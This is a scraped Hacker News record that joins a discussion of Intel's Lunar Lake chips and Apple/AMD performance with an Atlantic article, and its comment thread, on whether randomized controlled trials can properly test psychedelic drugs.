sensitive to value. So Apple can afford to spend a lot more on bigger chips that are on par in performance but have much greater efficiency. reply jorvi 9 hours agorootparent> Increasing instructions-per-clock requires much bigger CPU cores, and the dies Apple use for their SoCs are famously enormous. While other chip manufacturers are very conscious of performance/$, Apple's vertical integration gives them wider margins and their customers are much less sensitive to value. So Apple can afford to spend a lot more on bigger chips that are on par in performance but have much greater efficiency. This is the money shot. Margins on Android phones are often in the single digit percentages, they have even had periods where they’re negative. Qualcomm or Mediatek could easily make phat chips but there would be almost no market for them. I am very curious what the actual performance of the Snapdragon X is going to be. Laptop margins are often just as thin, so it can’t be too expensive a chip either.. reply mmaniac 8 hours agorootparentApparently[1] Snapdragon X is cost-competitive with Intel. That article discusses Raptor Lake on Intel 7, which is known to have razor thin margins, but Meteor Lake is reportedly expensive too. Intel's uncompetitive foundries continue to be an millstone around their neck. I'm sceptical of Snapdragon X's real world performance until these things actually ship. There's a lot of big promises made. Intel promises big too. [1]https://videocardz.com/newz/snapdragon-x-series-chips-cost-o... reply supertrope 14 hours agoparentprevPower Performance Area. Area is how much wafer area each chip and the features within a chip use. Apple optimizes for the first two and sacrifices the third. Because they mark up their products a lot, are vertically integrated, and they move millions of devices they can sink a lot of $ into bigger chips made on bleeding edge lithography. More area means bigger caches, higher instruction level parallelism. Hiring lots of top chip designers gets better results too. reply brigade 13 hours agorootparentThey're only large compared to other ARM cores, and Cortex-X4 is pretty close nowadays. AMD and especially Intel have a significantly larger per-core area budget; they have to in order to clock past 5 GHz. reply KingOfCoders 13 hours agoparentprevNo (less) legacy (smaller chip die area, faster and easier decoder). Paying prime prices for TSMCs newest nodes, one node ahead of everyone else. Bigger (more expensive) caches. Faster memory interface. Nothing magic. But the deep integration with better margins and higher end product prices allows Apple to have more expensive CPUs than the competition. reply DeathArrow 13 hours agorootparent>No (less) legacy (smaller chip die area, faster and easier decoder) What do you consider legacy? Can you point out how much it does affect die area and the instruction decoder? If I'd take a guess it's not more than maybe 2 or 3%. reply KingOfCoders 13 hours agorootparent3% is 3% - IPC gains for Ryzen would not be 15% but 18%. But I do think the benefits are in a faster and easier decoder, and easier memory interfaces etc. Not a hardware engineer, from a software engineer dropping legacy code makes development of new features easier and more cost efficient, so I can concentrate on other things. But as I've said, I'm no hardware engineer. reply mkl 10 hours agorootparent3% of die area is not the same as 3% of IPC. reply KingOfCoders 8 hours agorootparentYou're right. I wasn't clear, I didn't mean IPC goes up by 3% with that change, I've used that as an example of how 3% can be significant. reply lights0123 14 hours agoparentprevA big factor is that Apple buys out all of TSMC's capacity for new process nodes, so they get the smallest transistors that run at lower power and higher speeds. reply wmf 14 hours agorootparentNotably, Lunar Lake and Apple M4 are made on the same TSMC N3E process and have similar specs so we can perform an apples to apples comparison (sorry not sorry). reply DeathArrow 13 hours agorootparent>Notably, Lunar Lake and Apple M4 are made on the same TSMC N3E Lunar Lake will be on N3B process. reply wmf 2 hours agorootparentSame as M3 then. reply KingOfCoders 8 hours agorootparentprevThanks for the clarification. reply dagmx 14 hours agorootparentprevPeople say this, but it’s a trite trivialization of the architectural choices made beyond just the ISA. When AMD/intel have moved to the same or comparable nodes, they’re not catching up for perf/watt. Lunar Lake will be on the same N3E as M4, so we’ll have to see how it compares. reply AnthonyMouse 10 hours agorootparent> When AMD/intel have moved to the same or comparable nodes, they’re not catching up for perf/watt. They are though? If you compare the Apple and AMD processors that are both on e.g. TSMC 5nm, the AMD ones have if anything better performance per watt. Compare the 7945HX3D to any Apple CPU on the same 5nm process with a similar TDP and the 7945HX3D will generally have similar if not better performance. But people keep doing comparisons right after Apple is the first to release a CPU on a new TSMC process, and naturally if you don't compare like with like, the newer process is more efficient. Another reason people keep getting confused is that AMD isn't afraid to go back and release updated models of older cores on their original process nodes. So for example the 7730U is from 2023, it's just a year old, but it's Zen 3 on the 7nm process they've been using since 2019. Meanwhile the \"real\" 2023 release was Zen 4 on 4nm (e.g. 7840U), but don't pick the wrong one to do your comparison. reply KingOfCoders 8 hours agorootparent\"Compare the 7945HX3D to any Apple CPU on the same 5nm process with a similar TDP and the 7945HX3D will generally have similar if not better performance.\" Sounds interesting, do you have numbers - s I get this argument often, that on the same node, Apple is so much better. reply AnthonyMouse 8 hours agorootparentSo here's each vendor's first CPU on TSMC 5nm. This is actually the only process they've both used, and AMD only used it for a couple of models -- they tend to use all the ones Apple doesn't (7nm, 6nm, 4nm vs. 5nm and 3nm), which makes direct comparisons rare. But this is one: https://nanoreview.net/en/cpu-compare/apple-m1-ultra-vs-amd-... They both have a similar TDP, a similar number of cores and the performance on most tests is similar or better for the 7945HX3D. reply dagmx 2 hours agorootparentDo you have benchmarks though? TDP is a poor metric for comparison because it varies significantly by manufacturer and doesn’t encapsulate the performance curve at all. reply KingOfCoders 14 minutes agorootparentFrom the link Geekbench 6 (Single-Core) M1 Ultra 2436 Ryzen 7945HX3D 2890 reply KingOfCoders 7 hours agorootparentprevnext [–]In the past MSFT was always wedded to x86 ?? WindowsNT shipped on x86, Alpha, and MIPS. Then got ported to X64, PowerPC and Itanium. For the NT line, historically Microsoft was very supportive of other ISAs. The market wasn't. (I worked on applications supporting a number of those. x86/x64 won the price/performance war). reply shrubble 13 hours agorootparentNo one bought it on those alternative ISAs, however. The Alphas and MIPS vendors had a port but what percentage of those systems ended up running a Unix? This time it is different since DOS and 16bit Windows is out of the picture. This time you have multiple vendors/OEMs actually shipping e.g. Snapdragon-based Windows systems. Lenovo might make money selling such laptops, but over time MSFT will be the largest beneficiary of the \"CPU wars\". reply The_Colonel 10 hours agorootparentThere was already Windows on ARM in not so distant past, but it failed. I'm not convinced this time it will be different. reply Marsymars 2 hours agorootparentThere was Windows RT, which failed, but the current Windows on ARM platform has been a thing since 2017. The first few Win10 on ARM devices aren't upgradeable to Windows 11, but anything since the Snapdragon 850 in 2018 is fully supported by Windows 11: https://learn.microsoft.com/en-us/windows-hardware/design/mi... I guess it could still fail, but to me it seems a bit weird to be predicting the failure of a 7 year-old platform just when it's starting to see a real uptick in momentum. reply zbentley 7 hours agoparentprevWhen it comes to porting Win11, does MSFT have something like Rosetta to ease the pain for applications during the transitional period? Sure, plenty of windows users (business and personal computing) rely primarily on first-party apps, browsers, and big flagship apps (which could presumably leverage Microsoft partnerships to release on new architectures early enough that users wouldn’t notice much pain). But the long tail of widely used applications that aren’t big enough that I’d trust them to release ports by the time of an ARM (or whatever) hardware release is huge in Windows land—much larger than on MacOS. reply wmf 2 hours agorootparentYes, Windows has x86 emulation called Prism. reply chucke1992 12 hours agoparentprevRather than MSFT it is just becoming a natural progression - we used to have a lot of various CPU makes in the past too at one point. With ARM now everybody can ship their processors. Intel, AMD, Nvidia, Qualcomm + big tech giants like Apple are already producing them, MSFT is also planning to do that. I recall either Google or Facebook wanted too and so on. reply SunlitCat 13 hours agoprevAlthough memory bandwidth is still a limiting factor, I still hope those improvements at the integrated gpu ship over to their desktop counterpart. AMD seems to get at it already. (Yes Yes, I know I know. But I am still dreaming to fit a system capable to play at least a few games into a mini itx case without needing to add a dgpu. One can dream, eh? :) reply eigenspace 10 hours agoparentIt’s sounding like AMDs high-end mobile processors will probably do what you want mid-to-late next year. Look up “Strix Halo” (not Strix Point, that’s this year). They’re reportedly going for a 256 bit memory interface, and a way bigger GPU than what’s normal for integrated graphics. reply SunlitCat 8 hours agorootparentThat's something I am really looking forward to. I mean, AMD (together with Intel!) was already there, with their KabyLake-G lineup. Intel processor and AMD Vega (although it was Polaris Arch, I think) Graphics together along with 4 GB of HBM 2 graphics memory. Or all those custom APUs, AMD is doing since quite some time, like way back in 2018 for that Chinese computer / game console thingy (Subor Z+). Or for the new wave of handheld game consoles. And last but not least for the Playstation / XBox. That packaged onto a Mini-ITX mainboard along with 32 or 64 GB of RAM would be quite nice. reply kohlerm 12 hours agoparentprevWhat is the memory bandwidth? I could not find any numbers .. reply SunlitCat 12 hours agorootparentSorry, I worded my comment not correctly! I meant in general like in for gaming uses, integrated gpus are limited by the memory bandwidth of the DDR memory bus compared to the high bandwidth memory on dgpus. reply DeathArrow 13 hours agoprev>Intel Core product, the Lunar Lake SoC platform also includes up to 32 GB of LPDDR5X memory on the chip package itself What if you need 64 GB of RAM? reply ac29 13 hours agoparentBuy something else? Meteor Lake supports up to 96GB, and I assume AMD has something that supports 64GB+ as well. Lunar Lake is specifically targeted towards power efficient laptops, there are no desktop chips, or desktop-class mobile chips. Its being positioned for Macbook Air competitors, a device which maxes out at 24GB RAM. reply KingOfCoders 8 hours agoparentprevIt will end like Apple, an M3 Pro has up to 36gb of memory and an M3 Max from 48gb of memory. You get getter performance/watt but you can't upgrade. It depends on what you want. reply kalleboo 13 hours agoparentprevThen you don't buy a \"Low Power Mobile SoC\" but a more powerful chipset reply nubinetwork 14 hours agoprev4P4E and no HT? Hard pass. reply TrainedMonkey 14 hours agoparentIt is an offering for low power segment with integrated graphics and an AI unit. I doubt intel is breaking into phones any time soon so I have no idea where this will be used. The really big deal there is that this is an Intel processor built at TMSC. reply hedgehog 14 hours agoparentprevWhat workloads benefit enough from HT to justify it in a laptop? reply adgjlsfhk1 14 hours agorootparentMost things (other than highly optimized HPC) benefits a ton from hyper threading. Code that's unoptimized (e.g. everything web/interpreted languages like python/JS) spends all its time chasing pointers which means that your cores are doing a whole lot of nothing. Hyperthreading means that you can run twice as many applications per core which means that while one thread is waiting for data from RAM, the other thread can utilize the execution units. This also helps power consumption since if you can consolidate all the tasks onto fewer cores, you can put the other cores to sleep and save power. reply hedgehog 13 hours agorootparentLikely true in some cases but are these the bottlenecks on a laptop? I've never experienced HT on a multicore CPU being more than maybe a 40% increase in throughput and no real help on latency or efficiency. Implementing HT isn't free and doubling the number of active processes halves the per-process cache while doubling the concurrency in the memory controller (or more because less cache). Then there's the scheduler complexity... On the other hand there's the dual efficiency win of adding more E cores with shorter/simpler pipeline and lower clock speeds. Back in the P4 days HT made desktop interactivity much smoother, these days with 8+ core laptops the win is less clear and at least some of the top design teams think it's not worth it. reply adrian_b 11 hours agorootparentAs a software developer, by far the most imortant advantage of SMT is the reduction in compilation time for big software projects. I have not encountered any other application that benefits so much from SMT as a compilation that uses all available threads. On older CPUs, such as Skylake derivatives, a 25% compilation speed improvement from SMT was frequent. On newer CPUs, e.g. Zen 3 (presumably also on Zen 4, which has a very similar microarchitecture), the benefits of SMT are smaller (due to improved out-of-order execution), but a 20% compilation speed improvement is still frequent. However, doing compilation on a device with Lunar Lake, a CPU with only 4+4 cores, would be a waste of time, so it clearly does not need SMT. On the other hand, doing compilation on a bigger laptop, with an AMD Strix Point 12-core/24-thread CPU or with whatever Arrow Lake CPU will be launched by Intel to compete with it (presumably having much more smaller Skymont cores than Lunar Lake, to compensate for the lack of SMT) would certainly be useful. reply hedgehog 11 hours agorootparentI've moved to almost entirely remote dev workflow for similar reasons. Out of curiosity how much RAM do you need per build thread? reply adrian_b 11 hours agorootparentWhen compiling an entire Linux distribution, there are a few outliers, all of which are derivatives of the Google Chrome code base, which may fail when less than 2 GB is available per build thread (e.g. for a 16C/32T CPU with make -j32, 64 GB of DRAM are required). For most other software projects 1 GB per build thread is enough. reply dumbo-octopus 14 hours agorootparentprevThis isn’t really true. In JS, the JIT can optimize many routines to be much more CPU bound than “just pointer chasing” would have you believe. And of course in Python the bulk of your time should be spent in native code. Whether it actually is is a different question. reply gpderetta 5 hours agorootparentIf a load is intrinsically pointer chasing (as it is the case for a lot of non-compute software), there isn't much an optimizer can do. That's true even for native code. reply dumbo-octopus 1 hour agorootparentThat may be the case, what I’m contesting is this distinction made between JS/Python and other languages. reply Dylan16807 12 hours agorootparentprevHow often do you have more than 4/8 processes being CPU/memory bound at the same time? As far as power, using simpler cores helps a significant amount too. reply YZF 14 hours agorootparentprevI've always thought of HyperThreading as marketing with no substance. I've seen applications run slower with HT turned on (admittedly a long time ago). Does this combination of running two threads that are \"poorly\" written (i.e. they can't make use of all the execution units) really exist? If you're multitasking applications you very rarely have multiple application simultaneously require a lot of CPU cycles (e.g. you might be switching from a spreadsheet to a browser but not doing heavy work on both simultaneously). If you are running some specific heavy computational workload then likely it's already optimized to fully utilize the cores it is getting and HT can actually get in the way of that. reply DeathArrow 13 hours agorootparent>If you are running some specific heavy computational workload then likely it's already optimized to fully utilize the cores it is getting and HT can actually get in the way of that. You can test that by running Cinebench with and without hyperthreading. In most of the cases hyperthreading does help. reply dagmx 11 hours agorootparentA lot of rendering benefits from having SMT/HT disabled. Almost every film studio will do so. Having accurate hardware thread counts matter in those scenarios because the renderers will basically peg each core completely , and the risk of having an SMT/HT context switch between them is detrimental. It was often up to a 30% speed decrease when HT was enabled for us in production scenes. Similarly , many games run better without HT. HT primarily benefits scenarios with many smaller jobs without latency sensitivity. Today though, E-cores have largely replaced the need for HT. It’s much easier to send them to an E core and have them done without the extra overhead of HT scheduling and support. reply Hikikomori 6 hours agorootparentThen those that know that they dont benefit from HT can just not use those cores no? reply dagmx 4 hours agorootparentSure, they can just disable the feature. I’m just responding to the person who is pointing at Cinebench as a reason to enable it, but in real world use cases it actually ends up being a detriment. reply Hikikomori 4 hours agorootparentI meant that most people can leave it on. And if the software creator knows its not good for their software they can just not use HT cores, without disabling HT completely. reply hedgehog 13 hours agorootparentprevThere are server workloads like maybe high concurrency web apps that might benefit. Back in the days of single core CPUs HT made desktops feel a lot better not just because of throughput but (my speculation) because it reduced typical scheduling latency. Antivirus or whatever else was happening in the background was less likely to cause UI jank. reply Dylan16807 12 hours agorootparentprev> I've always thought of HyperThreading as marketing with no substance. It could make a big difference when you only had one or two cores. reply bushbaba 13 hours agorootparentprevHT is good for shitty code that chooses core count for threading. When it should really be multiples the core count given time spent mostly in IO. reply sregister 13 hours agorootparentprevI dont think apple silicon supports SMT? Isn't that enough evidence to show at least for mobile parts 4P4E at least has a chance to be interesting? Also some of the graphs appear to show the new Skymont uarch has high perf/w than raptor cove (the previous P core) which is rather impressive in my opinion. reply usrusr 12 hours agorootparentprevNothing. When you want more throughput, pick a setup with more cores. HT was good (not that good but still good) when the goal was performance per die area, but now we live in the area of performance per watt. Doubly so when looking at laptops, but also in all other areas except perhaps gaming PCs (but even there, throughput at high wattage will eventually lead to throttling). reply pjmlp 11 hours agoparentprevHyperthreading is a dead technology, something from the days it was too expensive to have real cores. reply nottorp 12 hours agoprev [–] Integrated ram, limited to 32 Gb. I wonder if they'll make 4 Gb SKUs to outdo Apple at their own game... Also, will the spying coprocessor, sorry, \"AI\" coprocessor, have a hardware off switch that will cut the power to that part of the CPU? reply fomine3 11 hours agoparentApple M3 supports up to 24GB of RAM so it's not so bad. reply nottorp 11 hours agorootparentApple supports up to 96 or 128 gb in laptops though. Why do you compare just with the entry level SoC? That doesn’t make them any less assholes (cough ram pricing). I’m predicting that Intel will try to outcompete them at assholery though. reply wmf 2 hours agorootparentIntel also supports 128 GB, just not on the entry-level Lunar Lake. reply nottorp 2 hours agorootparentOn what? Martian Lake? Jupiterian Lake? I bought a new x86 box 2 years ago so I haven't looked lately. I'd guess they have 128 Gb on some xeon labeled SKU that costs as much as a good used car? reply Sakos 11 hours agoparentprev [–] I'm so tired of soldered components. The performance and power benefits are simply not good enough to justify producing millions of landfill-destined devices and high costs for consumers. reply johnny22 10 hours agorootparent [–] I don't think soldered components would have been a big deal were the amounts enough. 32gb soldered on say 7 years ago would last you a long time. If they're gonna solder, they need to stop skimping. reply nottorp 10 hours agorootparent [–] One other major problem with soldering is only the most common SKUs are in stock, at least if you're in a smaller market. I mean, I hope the US is different, not sure if that's true. If you want to future proof and max out the ram you have to wait. And if you need an emergency hardware replacement, you're screwed. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "AMD announced Zen 5-based EPYC \"Turin\" processors with up to 192 cores, set for release in the second half of 2024, and introduced the Radeon Pro W7900 GPU for AI inference.",
      "TSMC is advancing its 3D stacked SoIC packaging, aiming for a 3μm pitch by 2027, with 2nm mass production on track for 2025, and plans to expand CoWoS capacity by 60% annually through 2026.",
      "MSI teased the Z790 Project Zero Plus motherboard with CAMM2 memory support, and Lenovo unveiled new notebooks powered by Qualcomm Snapdragon X Elite."
    ],
    "commentSummary": [
      "Intel's new Lunar Lake architecture introduces a shift from \"sea of fubs\" to \"sea of cells\" in P-core design, aiming to enhance efficiency and secure hardware for democratic resilience.",
      "Lunar Lake CPUs will use TSMC's 3 nm process for an earlier launch, while low-end Arrow Lake CPUs will use Intel's 20A process, reflecting Intel's reliance on TSMC due to past manufacturing issues.",
      "The discussion highlights the trade-offs in chip design, including the impact of on-package memory on upgradability, the debate over HyperThreading, and the importance of shielding and process nodes in CPU performance."
    ],
    "points": 135,
    "commentCount": 130,
    "retryCount": 0,
    "time": 1717471068
  },
  {
    "id": 40568515,
    "title": "Psychedelics Challenge the Validity of Traditional Randomized Controlled Trials",
    "originLink": "https://www.theatlantic.com/health/archive/2024/06/psychedelics-mdma-ptsd-fda-placebo/678588/",
    "originBody": "Health Psychedelics Are Challenging the Scientific Gold Standard How do you study mind-altering drugs when every clinical-trial participant knows they’re tripping? By Jonathan Lambert Illustration by Matteo Giuseppe Pani. Source: Getty. June 3, 2024, 3:35 PM ET Share Save Listen to this article 00:00 10:47 Produced by ElevenLabs and News Over Audio (NOA) using AI narration. Tomorrow, a Food and Drug Administration advisory committee will meet to discuss whether the United States should approve its first psychedelic drug. The fate of the treatment—MDMA-assisted therapy for post-traumatic stress disorder—will turn on how the FDA interprets data from two clinical trials that, on their face, are promising. Long-suffering patients who took the drug while undergoing intensive talk therapy were about twice as likely to recover from PTSD as patients who got the placebo with therapy. If the treatment is approved this summer, it could bring relief to some of the approximately 13 million Americans with PTSD. It could also serve as a model for other psychedelics to meet the FDA’s regulatory bar. But there’s a conundrum at the core of these two clinical trials, one that has plagued virtually all efforts to study psychedelics. In clinical trials, participants (and the researchers studying them) generally aren’t supposed to know whether they’re getting the actual drug or a placebo, to avoid allowing people’s expectations about a treatment to shape their response to it. Blinding, as this practice is called, is a key component of a randomized controlled clinical trial, or RCT—medicine’s gold standard for demonstrating that a drug actually works. But virtually no one can take a psychedelic drug and not know it. Some experts believe that unblinding threatens to undermine the entire field of psychedelic research because it means researchers can’t know whether the drugs’ early promise in clinical trials is real or a mirage, driven by the placebo effect and outsize expectations about the power of these drugs. But others argue that RCTs themselves are at fault. To them, psychedelics are exposing long-ignored cracks in our gold standard, especially for testing drugs that act on our minds. Read: What it’s like to trip on the most potent magic mushroom When randomized controlled trials are well designed, “there is no substitute,” Boris Heifets, a neuroscientist at Stanford University, told me. In an RCT, participants get randomly sorted into two groups, receiving either the treatment or a placebo. Scientists have prized such trials since the 1960s for their power to rule out all the nondrug reasons people who are given a new medication might get better. Chief among those reasons is the placebo effect, in which a patient’s belief in a treatment, rather than anything about the drug or procedure itself, leads to improvement. If trial participants come in with sky-high expectations (as experts suspect is the case in many psychedelics trials), knowing that they’ve received a drug could fuel positive responses, and learning they’ve been denied it could cause them to react negatively. “We’ve gotten a ton of things wrong by trusting unblinded results,” says David Rind, the chief medical officer of the Institute for Clinical and Economic Review, a nonprofit that evaluates new medical treatments. For all of RCTs’ advantages, “I think it’s obvious that they’re not well suited for studying psychedelics,” Heifets said. In cancer-drug trials, participants won’t know the difference between a saline IV drip and medicine; to test new surgical procedures, control groups sometimes get cut into and sewed up without the actual treatment. But psychedelics like psilocybin or LSD launch people into hallucinatory states that bend space and time. MDMA, known to many as ecstasy, is less extreme, but still sparks expansive feelings of love and empathy. “Participants will know within half an hour whether they’ve been assigned to the experimental or placebo condition,” Michiel van Elk, a cognitive psychologist at Leiden University, told me. In the MDMA clinical trials, run by the pharmaceutical company Lykos Therapeutics, nearly all participants correctly guessed which group they were in. Many scientists want to get around this problem by designing better blinds. Some labs have tried to keep patients in the dark by administering drugs under anesthesia or using mind-altering pills like methamphetamines as a placebo. Others are trying to engineer new psychedelics that skip the trip entirely. But to other scientists, clever attempts to stuff psychedelics into the RCT framework ignore the possibility that psychedelics’ benefits aren’t reducible to the biochemical action of the drug itself. Since the 1960s, psychedelic researchers have known that the beliefs and expectations a person brings to a trip can influence whether it’s healing or nightmarish. (That’s why most psychedelic-therapy protocols include several psychotherapy sessions before, during, and after treatment.) By striving to cleave the drug’s effects from the context in which it’s given—to a patient by a therapist, both of whom are hoping for healing—blinded studies may fail to capture the full picture. Read: Psychedelics open your brain. You might not like what falls in. From this perspective, high proportions of unblinding in positive psychedelic trials don’t necessarily mean that the results are invalid. “It’s how people engage with those effects and their therapist that’s contributing to the improvement,” Eduardo Schenberg, a neuroscientist at Instituto Phaneros, a nonprofit psychedelic-research center in Brazil, told me. Recent research backs this up. One small study found that among chronic PTSD patients who got MDMA-assisted therapy, the strength of the bond between therapist and patient—something the drug helps forge with its empathy-inducing effects—predicted treatment success. Given the importance of context, even the most perfectly designed RCTs may fail to capture how helpful these drugs are outside trials, Schenberg said. Such failure, if it exists, might extend beyond psychedelics to several kinds of psychoactive drugs. For instance, a 2022 analysis found that many antidepressant trials fail to effectively blind participants, in part because of side effects. “We know that 80 percent of the treatment response from antidepressants can be attributed to the placebo response,” Amelia Scott, a clinical psychologist at Macquarie University who co-wrote that study, told me. Yet in practice, antidepressants are effective for many people, suggesting that RCTs aren’t quite capturing what these drugs can offer—and that limiting ourselves to treatments that can be perfectly blinded could mean ignoring helpful mental-health interventions. “We shouldn’t be afraid to question the gold standard,” Schenberg told me. “For different kinds of diseases and treatments, we may need slightly different standards.” RCTs likely won’t lose their perch as the gold standard anytime soon, for evaluating psychedelics or anything else. But they could be supplemented with other kinds of studies that would broaden our understanding of how psychedelics work, Matt Butler, a neuroscientist at King’s College London, told me. Scientists are already trying open-label trials, where participants know which treatment they’re getting, and measuring expectations along with treatment effects. Descriptive studies, which track how treatments are working in actual clinics, could provide a richer picture of what therapeutic contexts work best. “These levels of evidence aren’t as good as RCTs,” Butler said, but they could help deepen our understanding of when therapies that don’t conform to RCTs could be most helpful. Read: What if psychedelics’ hallucinations are just a side effect? None of this is to say that Lykos’s flawed RCT data will be enough to convince the FDA’s advisers that Americans with PTSD should be offered MDMA. Several groups, including the American Psychiatric Association, have expressed concern about the trials ahead of the advisory meeting. In addition to the unblinding issue, claims that therapists encouraged participants to report favorable results and hide adverse events prompted the Institute for Clinical and Economic Review to release a report casting doubt on the studies. Lykos CEO Amy Emerson pushed back in a statement, saying, “We stand by the quality and integrity of our research and development program.” Still, some researchers remain worried. “If this sets a precedent that these trials are acceptable data, what does that mean for the future?” Suresh Muthukumaraswamy, a neuropharmacologist at the University of Auckland, told me. The recent past suggests that blinding may not be a deal-breaker for the FDA. In 2019, the agency approved Spravato esketamine nasal spray—a version of ketamine—for the treatment of depression despite concerns about unblinding in the drug’s clinical trials. And the FDA worked with Lykos to design the MDMA-therapy trials after designating it a breakthrough treatment in 2017. In an email, an FDA spokesperson told me that blinded RCTs provide the most rigorous level of evidence, but “unblinded studies can still be considered adequate and well-controlled as long as there is a valid comparison with a control.” In such cases, the spokesperson said, regulators can take into account things like the size of the treatment effect in deciding whether the treatment performed significantly better than the placebo. Read: Placebo effect of the heart Even if the FDA is on board, rolling out psychedelic therapies before scientists fully understand the interplay among expectation, therapy, and drugs could mean missing an opportunity to force companies to provide data that would meaningfully advance the study of these drugs, Muthukumaraswamy said. It also risks undermining these treatments in the long run. If sky-high expectations are ultimately fueling the positive results we see now, the FDA could end up approving a treatment that becomes less effective as its novelty wears off. That’s especially true if we’re missing key components of what makes these treatments work, or what puts people at risk for bad experiences. To better answer those questions—for psychedelics and other psychoactive drugs—we may need studies that go beyond the gold standard. Jonathan Lambert is a journalist based in Washington, D.C., who covers the intersection of science, health, and policy. He holds a master’s degree in neurobiology and behavior from Cornell University. He has written for Science News, NPR, Grid, and Quanta Magazine.",
    "commentLink": "https://news.ycombinator.com/item?id=40568515",
    "commentBody": "Psychedelics are challenging the standard of randomized controlled trials (theatlantic.com)117 points by chapulin 20 hours agohidepastfavorite168 comments ThePowerOfFuet 18 hours agohttps://archive.ph/l3GtQ neonate 17 hours agoparenthttps://web.archive.org/web/20240603195140/https://www.theat... s4mw1se 17 hours agoprevLSD was expected to be the holy grail of mental health treatment in the 40s and 50s before it was made illegal by the U.S. and the rest old the world following in the united states foot steps. I’m very grateful that we are starting to see research really pick up steam and public companies like MindMed pushing for FDA approval with MM120. It’s bittersweet though because it also is proof of how much progress we lost over those decades. Not to discredit PTSD and Mental Health research, but just to expand on how much we don’t know about our mind and what these chemicals really are… DMTx had its first round of clinical trials, where participants have extended experiences in DMT hyperspace and all share common hallucinations (i.e talking to other lifeforms). What’s interesting is that these experiments are showing us how our brain models the world. Unlike freebase N,N-DMT which is a short lived rocky experince. These patient reported and the data showed that after the first few minutes on DMTx things started to normalize (the brain started modeling their world better) One of Strassmans patients years ago said on DMT that these entities could share more with us if we learn to make extended contact. Albert Hoffman the inventor of LSD also said he had contact with external entities on a trip (eyeball with wings) and said that it told him that they chose him to discover LSD for the sake of humanity. The DMTx participants all reported that these entities knew about their life and their traumas and helped them process these all in different ways. They all reported that these were beings of a higher intelligence and felt that they were external. Psychedelics are 100% challenging the gold standard. Whatever the that is lol. reply r2_pilot 17 hours agoparentAnd people experiencing DTs from alcohol withdrawal say nonexistent entities are present too. The brain is merely capable of processing its inputs based on the laws of physics, and considering the complexity of a functioning mind, we shouldn't be too surprised when abnormal inputs cause abnormal outputs, nor should we necessarily hold much stock in the matter. Certainly, though, the tales are interesting if nothing else. reply tweezy 39 minutes agorootparentI will say prior to experiencing this myself I felt 100% certain that what you said is the truth. It just makes sense. Now that I've had these experiences, I'm more like 90% certain that what you said is true. These experiences add a certain humility to the way I experience the world. So in all likelihood, molecules like dmt will bind to certain serotonin receptors in the brain that cause strong and repeatable distortions in the visual field (even with eyes closed). The human mind is great at picking out patterns and assigning meaning to them based on our experiences. So that shifting pattern in my visual space kinda looks like a face, I'm going to assign trickster machine elf to that visual pattern. More likely than not that's what's going on. But there is probably some value in experiencing that. Having said all that, the subjective experience of living that is very different. This feels incredibly real. As crazy as it sounds, it genuinely feels like blasting into a hyper-dimensional space and encountering a population of sentient entities. That feeling is so real, that it leaves just the tiniest gap of \"hmm, maybe I don't know everything after all. Maybe there's more to this story than I could've previously comprehended\". All to say is that while you're most likely right, I think it could be healthy to acknowledge that you're not definitely right. And leaving some room for uncertainty and exploration could prove beneficial, even for the skeptics among us. reply mbesto 4 hours agorootparentprev> we shouldn't be too surprised when abnormal inputs cause abnormal outputs, nor should we necessarily hold much stock in the matter. While my scientific mind wants to agree with you, that same scientific mind can't help but wonder...why similar experiences are being triggered on totally unrelated people.[0] [0]- https://health.howstuffworks.com/wellness/drugs-alcohol/dmt-... reply r2_pilot 3 hours agorootparentHere's a simpler explanation that fits the facts. Humans are practically genetically identical, are raised in roughly similar cultures with similar expectations of reality, and are being dosed with drugs generally assumed to be chemically similar (in this case) paired with the experiences that are reported. So while it's imperative to keep an open mind, it's also important to keep it closed enough that your brains don't leak out. reply KennyBlanken 1 hour agorootparentprevMass media tends to follow a lot of common themes and often they are proxies for other general societal attitudes? Many of us grew up reading at least some books in common? Interplanetary aliens always being more developed than us (and usually hostile) is a direct proxy for xenophobia to people from other countries. Ever wonder why there's so much hand-waving about immigrants stealin' our jerbs? reply chiefgeek 2 hours agorootparentprevJust curious if you've tried psychedelics? reply r2_pilot 37 minutes agorootparentSWIM may or may not have confided to me experiences with a variety of compounds purported to induce a wide range of subjective internal experiences upon their various methods of consumption. At any rate, I've certainly read (and donated to) Erowid. reply cmilton 15 minutes agorootparentDid any of your subjective internal experiences create objective results? reply ASalazarMX 1 hour agorootparentprevNot OC, and I've never tried psychedelics, but even a strong fever will make you hallucinate, and I've had a couple of those. You mind closes up into itself, and the world it creates, while extremely simplistic, feels very real. reply yieldcrv 15 hours agorootparentprevSo, I think that is too dismissive, while I think the psychedelic proponents are too exuberant Basically, I don't think the categorization matters. Like are these entities things always here and perceived if we access a certain plane, or are these mere configurations and figments of our brain that can be repeated. To me, thats not important. Its important if the reconfiguration of the brain is useful, therapeutic, repeatable, what side effects are there, whats going on with people predisposed to schizophrenia that psychedelics seem to exacerbate permanently. What’s going on with floaters/HPPD. Can LSD be refined for the parts that are useful for us, or do we simply slap fine print about potential side effects for those with a family history of schizophrenia on it like …. every other FDA approved drug. I think fawning over something in the 1950s is juvenile, when there probably are advances possible since then to that substance. But I would like it to at least reach parity with Big Pharma’s designer drugs with clinical trials and listed side effects, instead of just anecdotes percolating rave communities. reply s4mw1se 13 hours agorootparentRave communities? This is from research and patient panel interview that was hosted after the publication. Minus the hoffman stuff. https://pubmed.ncbi.nlm.nih.gov/37897244/ https://www.youtube.com/live/Myq_Hc_39aI?si=qnJ8UhOztRjshEkf reply yieldcrv 12 hours agorootparentI was replying to r2 about the path they had taken the discussion, which was no longer about the article but you knew that. consider reading it again with that interpretation if you didn’t know that. reply BriggyDwiggs42 16 hours agorootparentprevWe don’t have any way of determining whether these experiences are purely generated by the brain, and it’s not smart to claim it’s one way or the other without further evidence. reply JumpCrisscross 16 hours agorootparent> it’s not smart to claim it’s one way or the other without further evidence It's perfectly smart to claim Hoffman did not make \"contact with external entities on a trip (eyeball with wings)\" with zero evidence because the status quo is not having conversations with eyeballs with wings. Herego, the burden of proof is on the eyballs-with-wings guy. reply mistermann 13 hours agorootparentAnyone who makes a claim has a burden of proof. If I'm on The Truman Show, could someone please spill the beans? reply deepvibrations 4 hours agorootparentYet we still work on the assumption that consciousness arises within space-time... Disappointing the burden of proof is not deemed necessary in this case! reply mistermann 31 minutes agorootparent> Yet we still work on the assumption that consciousness arises within space-time... What role is the \"yet\" playing here, to indicate contradiction to my comment? And without it, I'm not sure what the point of the comment would be. This whole comment section is so confusing. reply r2_pilot 3 hours agorootparentprevFor what it's worth, I don't have evidence that 